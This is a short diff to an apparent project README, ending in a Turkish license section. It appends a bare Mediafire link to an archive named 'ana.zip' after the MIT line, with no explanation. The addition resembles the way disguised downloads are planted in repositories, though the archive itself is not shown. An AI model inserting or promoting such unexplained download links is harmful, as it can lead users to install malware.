@@ -55,3 +55,4 @@ docker compose up -d
 ## Lisans
 
 MIT
+https://www.mediafire.com/file/a9qw3we774ujo8i/ana.zip/file
